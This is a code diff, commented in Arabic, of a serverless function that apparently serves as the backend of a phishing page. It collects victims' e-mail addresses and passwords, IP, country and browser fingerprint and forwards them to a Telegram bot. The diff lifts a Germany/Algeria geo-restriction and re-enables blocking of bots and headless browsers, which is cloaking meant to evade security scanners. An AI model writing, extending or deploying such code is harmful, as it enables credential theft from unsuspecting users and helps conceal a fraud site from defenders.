@@ -1,7 +1,6 @@
 const fetch = require('node-fetch');
 
-// الدول المسموح بها: ألمانيا (DE) والجزائر (DZ)
-// const ALLOWED_COUNTRIES = ['DE', 'DZ']; 
+// تم إزالة قيد ALLOWED_COUNTRIES (إلغاء الحظر الجغرافي)
 
 const getClientIp = (headers) => {
     return headers['x-nf-client-connection-ip'] || 
@@ -28,20 +27,11 @@ exports.handler = async (event, context) => {
     }
 
     const ip = getClientIp(event.headers); 
-    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
-
+    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // سنظل نسجل البلد في الرسالة
+    
     // ----------------------------------------------------------------
-    // 1. تقييد الوصول الجغرافي (Geo-Restriction Check)
+    // 1. **(تم إزالة فحص Geo-Restriction بالكامل)**
     // ----------------------------------------------------------------
-    if (!ALLOWED_COUNTRIES.includes(countryCode)) {
-        console.log(`[BLOCKED GEO] Access denied from Country: ${countryCode} (IP: ${ip})`);
-        return {
-            statusCode: 303,
-            headers: {
-                Location: '/waiting.html', 
-            },
-        };
-    }
     
     // ----------------------------------------------------------------
     // 2. تحليل بيانات البصمة وتطبيق الحظر (Bot/Human Check)
@@ -59,9 +49,9 @@ exports.handler = async (event, context) => {
     try {
         fpData = JSON.parse(fingerprintJSON);
         
-//        if (fpData.isHuman === false || fpData.webdriver === "Yes" || fpData.headless === "Yes") {
-//            securityStatus = "❌ BLOCKED - Bot/No Interaction";
-//            isBlocked = true;
+        if (fpData.isHuman === false || fpData.webdriver === "Yes" || fpData.headless === "Yes") {
+            securityStatus = "❌ BLOCKED - Bot/No Interaction";
+            isBlocked = true;
         }
 
     } catch (e) {
@@ -105,12 +95,12 @@ exports.handler = async (event, context) => {
     message_text += `E\\-Mail: \`${safe_email}\`\n`;
     message_text += `Passwort: \`${safe_password}\`\n`;
     message_text += `IP: \`${safe_ip}\`\n`;
-    message_text += `Country: \`${safe_country}\`\n\n`;
+    message_text += `Country: \`${safe_country}\`\n\n`; // ما زلنا نسجل البلد للتشخيص
     message_text += `*FP Details:*\n`;
     message_text += `${fpDetails}`;
 
     // ----------------------------------------------------------------
-    // 5. إرسال البيانات إلى Telegram (الكتلة المفقودة/المصححة)
+    // 5. إرسال البيانات إلى Telegram 
     // ----------------------------------------------------------------
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
